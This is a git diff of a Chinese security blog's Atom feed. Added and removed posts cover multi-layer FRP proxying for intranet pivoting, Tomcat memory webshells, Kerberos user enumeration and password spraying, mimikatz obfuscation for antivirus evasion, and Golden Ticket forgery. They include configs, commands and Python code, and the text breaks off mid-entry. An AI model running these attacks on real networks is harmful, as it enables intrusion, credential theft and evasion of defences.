@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sherlocz.github.io/"/>
-  <updated>2021-06-23T08:50:50.583Z</updated>
+  <updated>2021-08-07T04:48:53.763Z</updated>
   <id>http://sherlocz.github.io/</id>
   
   <author>
@@ -15,6 +15,72 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>使用FRP进行多层流量代理</title>
+    <link href="http://sherlocz.github.io/2021/08/07/Muti-Frp/"/>
+    <id>http://sherlocz.github.io/2021/08/07/Muti-Frp/</id>
+    <published>2021-08-07T02:49:34.000Z</published>
+    <updated>2021-08-07T04:48:53.763Z</updated>
+    
+    <content type="html"><![CDATA[<p>frp作为常用的流量代理工具，在对于内网渗透过程中需要进行多层流量代理依然很方便，没有想象中的那么复杂。</p><p>Github地址：<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p><p>整体思路图如下：</p><p><img src="/2021/08/07/Muti-Frp/思路图.png" alt></p><p>我们需要通过在攻击机器上配置代理链(proxy chain)，去访问内网第三层机器的服务或者资源。</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>我这里开了三台虚拟机，配置了双网卡机器，在虚拟机内新建网卡，然后自定义IP，最后关掉防火墙就行：</p><p><img src="/2021/08/07/Muti-Frp/配置图.png" alt></p><h1 id="frp配置"><a href="#frp配置" class="headerlink" title="frp配置"></a>frp配置</h1><p>frp分为Server端和Client端，在作为代理的机器上配置好frps，需要把流量带出的机器配置frpc。</p><p>整体路线如下：<br><img src="/2021/08/07/Muti-Frp/sc.png" alt></p><p>在VPS上上传好我们的frps，frps.ini文件内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 47854#客户端回连端口</span><br><span class="line">dashboard_port = 47855#web管理端端口</span><br><span class="line">token = !q@w#e$r#加入token值进行认证</span><br><span class="line">dashboard_user = 0934ht39#web端账号</span><br><span class="line">dashboard_pwd = qpo34hjtpq4#web端密码</span><br></pre></td></tr></table></figure></p><p>后台启用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./frps -c frps.ini 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></p><p>输出如下表示成功：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-8-ubuntu:/home/frp/frptest# cat nohup.out</span><br><span class="line">2021/08/07 11:41:51 [I] [service.go:157] frps tcp listen on 0.0.0.0:47854</span><br><span class="line">2021/08/07 11:41:51 [I] [service.go:273] Dashboard listen on 0.0.0.0:47855</span><br><span class="line">2021/08/07 11:41:51 [I] [root.go:209] start frps success</span><br></pre></td></tr></table></figure></p><p>接下来配置客户端，上传frpc，frpc.ini内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = xx.xx.xx.xx#VPS地址</span><br><span class="line">server_port = 47854#Server端设置的回连端口</span><br><span class="line">token = !q@w#e$r#加入token值进行认证</span><br><span class="line"></span><br><span class="line">[plugin_socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 6010#新建socks5代理端口</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = admin#socks5代理账号</span><br><span class="line">plugin_passwd = admin#socks5代理密码</span><br></pre></td></tr></table></figure></p><p>运行  <strong>frpc -c frpc.ini</strong>，成功配置连接会有如下提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2021/08/07 11:47:23 [I] [service.go:282] [f6c32677441abc76] login to server succ</span><br><span class="line">ess, get run id [f6c32677441abc76], server udp port [0]</span><br><span class="line">2021/08/07 11:47:23 [I] [proxy_manager.go:144] [f6c32677441abc76] proxy added: [</span><br><span class="line">plugin_socks5]</span><br><span class="line">2021/08/07 11:47:23 [I] [control.go:179] [f6c32677441abc76] [plugin_socks5] star</span><br><span class="line">t proxy success</span><br></pre></td></tr></table></figure></p><p>我们可以使用proxifier进行测试</p><p><img src="/2021/08/07/Muti-Frp/42.png" alt></p><p>同样后续在其他内网机器上配置，frps.ini无需改动，frpc.ini的ip修改成上一层的ip地址就行。</p><p>最终效果如下：<br><img src="/2021/08/07/Muti-Frp/3.png" alt></p><p>proxychain如下：<br><img src="/2021/08/07/Muti-Frp/6666.png" alt><br>从外层到内层依次排序</p><p>无论是几层代理，按照这个思路去弄就行了</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;frp作为常用的流量代理工具，在对于内网渗透过程中需要进行多层流量代理依然很方便，没有想象中的那么复杂。&lt;/p&gt;
+&lt;p&gt;Github地址：&lt;a href=&quot;https://github.com/fatedier/frp&quot; target=&quot;_blank&quot; rel=&quot;noope
+      
+    
+    </summary>
+    
+    
+    
+      <category term="frp" scheme="http://sherlocz.github.io/tags/frp/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>内存马</title>
+    <link href="http://sherlocz.github.io/2021/06/24/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
+    <id>http://sherlocz.github.io/2021/06/24/内存马/</id>
+    <published>2021-06-24T03:16:46.000Z</published>
+    <updated>2021-06-24T03:42:43.191Z</updated>
+    
+    <content type="html"><![CDATA[<p>Tomcat中内存马的分类：<br>Listener型内存马<br>Filter型内存马<br>Servlet型内存马</p><p>优先级：listeners-&gt;filters-&gt;servlets</p><p>Sevlet主要的作用是可以动态的生成Web页面，他执行在客户端请求和服务器响应之间</p><p>Filter是一段可以复用的代码，用来拦截HTTP请求、响应、进行一些处理和转换</p><p>Servlet和Filter初始化后会在内存中长期驻留，所以我们只要将其注入到内存中就可以一直生效，直到容器销毁，这就是内存马的实现基础。</p><p>Filter和Servlet的上下文全部存放在ServletContent中，所以需要先获取到ServletContext实例</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;Tomcat中内存马的分类：&lt;br&gt;Listener型内存马&lt;br&gt;Filter型内存马&lt;br&gt;Servlet型内存马&lt;/p&gt;
+&lt;p&gt;优先级：listeners-&amp;gt;filters-&amp;gt;servlets&lt;/p&gt;
+&lt;p&gt;Sevlet主要的作用是可以动态的生成Web页面
+      
+    
+    </summary>
+    
+    
+    
+      <category term="Java" scheme="http://sherlocz.github.io/tags/Java/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>AntSword-analysis-php</title>
+    <link href="http://sherlocz.github.io/2021/06/24/AntSword-analysis-php/"/>
+    <id>http://sherlocz.github.io/2021/06/24/AntSword-analysis-php/</id>
+    <published>2021-06-24T01:50:01.000Z</published>
+    <updated>2021-06-24T01:50:01.311Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>behinder3.0流量分析(PHP)</title>
@@ -445,80 +511,6 @@
     
     
       <category term="环境搭建" scheme="http://sherlocz.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>基于kerberos协议的域内用户名密码爆破</title>
-    <link href="http://sherlocz.github.io/2020/10/26/kerberos-brute/"/>
-    <id>http://sherlocz.github.io/2020/10/26/kerberos-brute/</id>
-    <published>2020-10-26T06:41:54.000Z</published>
-    <updated>2020-10-26T08:40:38.415Z</updated>
-    
-    <content type="html"><![CDATA[<p>拿到域内机器之后，我们需要横向移动，域内用户账号密码的收集和爆破也是很重要的。</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>domain:hacke.testlab(192.168.43.100)<br>win2008:192.168.43.110</p><h1 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h1><p><img src="/2020/10/26/kerberos-brute/kerberos.png" alt><br>一般情况下我们的KDC就是DC</p><h1 id="域用户爆破"><a href="#域用户爆破" class="headerlink" title="域用户爆破"></a>域用户爆破</h1><h2 id="kerbrute"><a href="#kerbrute" class="headerlink" title="kerbrute"></a>kerbrute</h2><p>基于golang编写的一款爆破工具，支持域内用户名枚举、密码爆破，支持win/linux。</p><p>github:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ropnop/kerbrute.git</span><br></pre></td></tr></table></figure></p><p>下载好之后用golang进行编译<br><img src="/2020/10/26/kerberos-brute/gobuild.png" alt></p><p>会生成<strong>kerbrute.exe</strong></p><p>放到域内机器执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#用户名枚举</span><br><span class="line">kerbrute.exe userenum -d dc.local username.txt</span><br><span class="line">#密码喷洒</span><br><span class="line">kerbrute.exe passwordspray -d dc.local username.txt password</span><br></pre></td></tr></table></figure></p><p>效果如下：</p><p><img src="/2020/10/26/kerberos-brute/enum.png" alt><br><img src="/2020/10/26/kerberos-brute/passwordspray.png" alt></p><h2 id="pykerbrute"><a href="#pykerbrute" class="headerlink" title="pykerbrute"></a>pykerbrute</h2><p>三好学生编写的py脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#用户名枚举</span><br><span class="line">EnumADUser.py &lt;domainControlerAddr&gt; &lt;domainName&gt; &lt;mode&gt;</span><br><span class="line">&lt;mode&gt;: tcp or udp</span><br><span class="line">#密码喷洒</span><br><span class="line">ADPwdSpray.py &lt;domainControlerAddr&gt; &lt;domainName&gt; &lt;file&gt; &lt;passwordtype&gt; &lt;data&gt; &lt;mode&gt;</span><br><span class="line">&lt;mode&gt;: tcp or udp</span><br></pre></td></tr></table></figure></p><p>效果如下：</p><p><img src="/2020/10/26/kerberos-brute/py.png" alt><br><img src="/2020/10/26/kerberos-brute/py.png" alt></p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>其实就是发送认证的包，抓取返回值(原理文章后面有写)<br>这里看EnumADUser.py<br>AS-REQ结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">def build_req_body(realm, service, host, nonce, cname=None):</span><br><span class="line"> </span><br><span class="line">    req_body = KdcReqBody()</span><br><span class="line"></span><br><span class="line">    # (Forwardable, Proxiable, Renewable, Canonicalize)</span><br><span class="line">#   req_body[&apos;kdc-options&apos;] = &quot;&apos;01010000100000000000000000000000&apos;B&quot;</span><br><span class="line">    req_body[&apos;kdc-options&apos;] = &quot;&apos;00000000000000000000000000010000&apos;B&quot;</span><br><span class="line">    if cname is not None:</span><br><span class="line">        req_body[&apos;cname&apos;] = None</span><br><span class="line">        req_body[&apos;cname&apos;]</span><br><span class="line">        req_body[&apos;cname&apos;][&apos;name-type&apos;] = NT_PRINCIPAL</span><br><span class="line">        req_body[&apos;cname&apos;][&apos;name-string&apos;] = None</span><br><span class="line">        req_body[&apos;cname&apos;][&apos;name-string&apos;][0] = cname</span><br><span class="line"></span><br><span class="line">    req_body[&apos;realm&apos;] = realm</span><br><span class="line"></span><br><span class="line">    req_body[&apos;sname&apos;] = None</span><br><span class="line">    req_body[&apos;sname&apos;][&apos;name-type&apos;] = NT_SRV_INST</span><br><span class="line">    req_body[&apos;sname&apos;][&apos;name-string&apos;] = None</span><br><span class="line">    req_body[&apos;sname&apos;][&apos;name-string&apos;][0] = service</span><br><span class="line">    req_body[&apos;sname&apos;][&apos;name-string&apos;][1] = host</span><br><span class="line"></span><br><span class="line">    req_body[&apos;till&apos;] = &apos;19700101000000Z&apos;</span><br><span class="line">    </span><br><span class="line">    req_body[&apos;nonce&apos;] = nonce</span><br><span class="line"></span><br><span class="line">    req_body[&apos;etype&apos;] = None</span><br><span class="line">    req_body[&apos;etype&apos;][0] = RC4_HMAC</span><br><span class="line">    </span><br><span class="line">    return req_body</span><br></pre></td></tr></table></figure></p><p>进行封装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def build_as_req(target_realm, user_name, nonce):</span><br><span class="line">    req_body = build_req_body(target_realm, &apos;krbtgt&apos;, target_realm, nonce, cname=user_name)</span><br><span class="line"></span><br><span class="line">    as_req = AsReq()</span><br><span class="line"></span><br><span class="line">    as_req[&apos;pvno&apos;] = 5</span><br><span class="line">    as_req[&apos;msg-type&apos;] = 10</span><br><span class="line"></span><br><span class="line">    as_req[&apos;padata&apos;] = None</span><br><span class="line"></span><br><span class="line">    as_req[&apos;req-body&apos;] = _v(4, req_body)</span><br><span class="line">    print(as_req)</span><br><span class="line"></span><br><span class="line">    return as_req</span><br></pre></td></tr></table></figure></p><p>发送请求tcp/udp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def send_req_tcp(req, kdc, port=88):</span><br><span class="line">    data = encode(req)</span><br><span class="line">    data = pack(&apos;&gt;I&apos;, len(data)) + data</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((kdc, port))</span><br><span class="line">    sock.send(data)</span><br><span class="line">    return sock</span><br><span class="line"></span><br><span class="line">def send_req_udp(req, kdc, port=88):</span><br><span class="line">    data = encode(req)</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    sock.connect((kdc, port))</span><br><span class="line">    sock.send(data)</span><br><span class="line">    return sock</span><br></pre></td></tr></table></figure></p><p>接收请求tcp/udp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">def recv_rep_tcp(sock):</span><br><span class="line">    data = &apos;&apos;</span><br><span class="line">    datalen = None</span><br><span class="line">    while True:</span><br><span class="line">        rep = sock.recv(8192)</span><br><span class="line">        if not rep:</span><br><span class="line">            sock.close()</span><br><span class="line">            raise IOError(&apos;Connection error&apos;)</span><br><span class="line">        data += rep</span><br><span class="line">        if len(rep) &gt;= 4:</span><br><span class="line">            if datalen is None:</span><br><span class="line">                datalen = unpack(&apos;&gt;I&apos;, rep[:4])[0]</span><br><span class="line">            if len(data) &gt;= 4 + datalen:</span><br><span class="line">                sock.close()</span><br><span class="line">                return data[4:4 + datalen]</span><br><span class="line"></span><br><span class="line">def recv_rep_udp(sock):</span><br><span class="line">    data = &apos;&apos;</span><br><span class="line">    datalen = None</span><br><span class="line">    while True:</span><br><span class="line">        rep = sock.recv(8192)</span><br><span class="line">        if not rep:</span><br><span class="line">            sock.close()</span><br><span class="line">            raise IOError(&apos;Connection error&apos;)</span><br><span class="line">        data += rep</span><br><span class="line">        if len(rep) &gt;= 4:</span><br><span class="line">            sock.close()</span><br><span class="line">            return data</span><br></pre></td></tr></table></figure></p><p>验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def checkuser_tcp(user_realm, user_name, kdc_a):</span><br><span class="line">     </span><br><span class="line">    nonce = getrandbits(31)  </span><br><span class="line">    as_req = build_as_req(user_realm, user_name, nonce)</span><br><span class="line">    sock = send_req_tcp(as_req, kdc_a)</span><br><span class="line">    data = recv_rep_tcp(sock)</span><br><span class="line">    i=0</span><br><span class="line">    for c in data:       </span><br><span class="line">        i=i+1</span><br><span class="line">        if(i==47):</span><br><span class="line">            if(ord(c)==0x19):</span><br><span class="line">                print(&apos;[+] Valid user: %s&apos;%(user_name))</span><br><span class="line"></span><br><span class="line">def checkuser_udp(user_realm, user_name, kdc_a):</span><br><span class="line">     </span><br><span class="line">    nonce = getrandbits(31)  </span><br><span class="line">    as_req = build_as_req(user_realm, user_name, nonce)</span><br><span class="line">    sock = send_req_udp(as_req, kdc_a)</span><br><span class="line">    data = recv_rep_udp(sock)</span><br><span class="line">    i=0</span><br><span class="line">    for c in data:       </span><br><span class="line">        i=i+1</span><br><span class="line">        if(i==47):</span><br><span class="line">            if(ord(c)==0x19):</span><br><span class="line">                print(&apos;[+] Valid user: %s&apos;%(user_name))</span><br></pre></td></tr></table></figure></p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>使用win2008登陆域用户，会向我们的域控发起认证请求</p><h2 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h2><p>在认证过程中，若用户名不存在，AS-REQ请求会返回对应的错误信息<br><img src="/2020/10/26/kerberos-brute/unknownuser2.png" alt><br><img src="/2020/10/26/kerberos-brute/unknownuser.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用户不存在：</span><br><span class="line">error_code:eRR-C-PRINCIPALL-UNKNOWN</span><br><span class="line">用户存在：</span><br><span class="line">error_code:eRR-PREAUTH-REQUIRED</span><br></pre></td></tr></table></figure><h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>在认证过程中，若密码错误，AS-REQ请求会返回对应的错误信息<br><img src="/2020/10/26/kerberos-brute/passwordrequire.png" alt><br><img src="/2020/10/26/kerberos-brute/passwordrequire2.png" alt><br>特征：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_code:eRR-PREAUTH-FAILED</span><br></pre></td></tr></table></figure></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/8187" title="https://xz.aliyun.com/t/8187" target="_blank" rel="noopener">内网渗透之kerberos协议分析</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&amp;mid=2247483670&amp;idx=1&amp;sn=1063bf299a8894f87521e8d73a687ff3&amp;chksm=eaa5bb36ddd2322086fc0218a8d21c9d5602dff7aee67f065040b80e8d6bb676d8dbfa09f8ff&amp;mpshare=1&amp;scene=1&amp;srcid=10264x2ShzrGPOXac4PWw5Gk&amp;sharer_sharetime=1603698453434&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=de879d1d09e2a8b778841b0be47afa29672479cb903399099f08479ef0dda0812b37579c0417dac7f3758adc60e53ea6f07d2d067b7cbe6b183ac35b394c2bfdcd1cd7e8f9fff19ba08344491cfefa1a3f14d75b4c9e2278e48a036f130c4b72a8c128393147e5bcd2b1db960d590e9188ecfaeb289d570f85910170e5627a28&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=6300002f&amp;lang=zh_CN&amp;exportkey=AwKZNFdw%2FNyuZo%2BMpedulXU%3D&amp;pass_ticket=aMSAguw%2B9AAx19KRHCD36hX7xx3it%2B1gt3T%2BbrbyfO97iXDUbUjaF4%2B8IcOAAkny&amp;wx_header=0" title="https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&amp;mid=2247483670&amp;idx=1&amp;sn=1063bf299a8894f87521e8d73a687ff3&amp;chksm=eaa5bb36ddd2322086fc0218a8d21c9d5602dff7aee67f065040b80e8d6bb676d8dbfa09f8ff&amp;mpshare=1&amp;scene=1&amp;srcid=10264x2ShzrGPOXac4PWw5Gk&amp;sharer_sharetime=1603698453434&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=de879d1d09e2a8b778841b0be47afa29672479cb903399099f08479ef0dda0812b37579c0417dac7f3758adc60e53ea6f07d2d067b7cbe6b183ac35b394c2bfdcd1cd7e8f9fff19ba08344491cfefa1a3f14d75b4c9e2278e48a036f130c4b72a8c128393147e5bcd2b1db960d590e9188ecfaeb289d570f85910170e5627a28&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=6300002f&amp;lang=zh_CN&amp;exportkey=AwKZNFdw%2FNyuZo%2BMpedulXU%3D&amp;pass_ticket=aMSAguw%2B9AAx19KRHCD36hX7xx3it%2B1gt3T%2BbrbyfO97iXDUbUjaF4%2B8IcOAAkny&amp;wx_header=0" target="_blank" rel="noopener">这是一篇“不一样”的真实渗透测试案例分析文章</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;拿到域内机器之后，我们需要横向移动，域内用户账号密码的收集和爆破也是很重要的。&lt;/p&gt;
-&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;domain:hacke.testlab(19
-      
-    
-    </summary>
-    
-    
-    
-      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>mimikatz简单免杀</title>
-    <link href="http://sherlocz.github.io/2020/10/10/Obfuscate-Mimikatz/"/>
-    <id>http://sherlocz.github.io/2020/10/10/Obfuscate-Mimikatz/</id>
-    <published>2020-10-10T04:43:43.000Z</published>
-    <updated>2020-10-10T07:44:27.765Z</updated>
-    
-    <content type="html"><![CDATA[<p>传送门：<a href="https://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/" title="https://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/">【原版mimikatz编译】</a></p><h1 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h1><p><a href="https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh" title="https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh" target="_blank" rel="noopener">https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh</a></p><p><a href="https://github.com/upx/upx" title="https://github.com/upx/upx" target="_blank" rel="noopener">https://github.com/upx/upx</a><br>混淆-&gt;upx加壳</p><p>卡巴的每次都要重新编译，upx加壳</p><p><img src="/2020/10/10/Obfuscate-Mimikatz/kabasiji.png" alt><br><img src="/2020/10/10/Obfuscate-Mimikatz/360.png" alt><br><img src="/2020/10/10/Obfuscate-Mimikatz/huorong.png" alt><br><img src="/2020/10/10/Obfuscate-Mimikatz/symantec.png" alt></p><p>upx过后的大小在800kb左右</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;传送门：&lt;a href=&quot;https://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/&quot; title=&quot;https://sherlocz.github.io/2020/05/20/mimikatz%E7%
-      
-    
-    </summary>
-    
-    
-    
-      <category term="免杀" scheme="http://sherlocz.github.io/tags/%E5%85%8D%E6%9D%80/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>kerberos协议中的票据传递攻击</title>
-    <link href="http://sherlocz.github.io/2020/09/20/kerberos-PtT/"/>
-    <id>http://sherlocz.github.io/2020/09/20/kerberos-PtT/</id>
-    <published>2020-09-19T16:08:10.000Z</published>
-    <updated>2021-02-19T03:30:40.772Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="PtT"><a href="#PtT" class="headerlink" title="PtT"></a>PtT</h1><p>Pass the Ticket，基于Kerberos协议进行攻击，通常是用来做<strong>权限维持</strong></p><h1 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>client端在和KDC进行认证的过程中，TGT是由域内krbtgt用户hash计算生成，所以当我们得到了域内krbtgt用户的NTLM 哈希或AES-256的值，可以将权限伪装成任意域内用户(包括域管用户)。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞前提：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.要伪装的域内用户名</span><br><span class="line">2.krbtgt用户hash</span><br><span class="line">3.krbtgt用户sid</span><br><span class="line">4.域名</span><br></pre></td></tr></table></figure></p><p>利用mimikatz可以进行伪造</p><p>首先我们要知道krbtgt的相关信息，在域控制器中执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /user:krbtgt</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/20/kerberos-PtT/1.png" alt></p><p>获取到sid(sid去除id后面的502)和ntlm hash如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sid:S-1-5-21-306775267-2343279330-10040798</span><br><span class="line">hash:8fe2af5ffd00a2b58a9a42c8c95ee373</span><br></pre></td></tr></table></figure></p><p>接下来在域内一台机器上生成Golden Ticket：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">kerberos::golden /user:hacke\administrator /domain:hacke.testlab/sid:S-1-5-21-306775267-2343279330-10040798 /krbtgt:8fe2af5ffd00a2b58a9a42c8c95ee373 /ptt  </span><br><span class="line"></span><br><span class="line">kerberos::ptt C:\Users\oreo\Desktop\ticket.kirbi #导入票据</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/20/kerberos-PtT/2.png" alt></p><p>成功导入，可以利用cmd下的klist命令查看导入的票据。</p><p>这里导入票据之后，我们可以看下是否能够伪造身份：</p><p><img src="/2020/09/20/kerberos-PtT/3.png" alt></p><p>dir 域控的目录，能够成功访问，说明票据成功</p><h1 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h1><h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>伪造ST服务票据，不需要和KDC进行交互，动静较小</p><h2 id="复现过程-1"><a href="#复现过程-1" 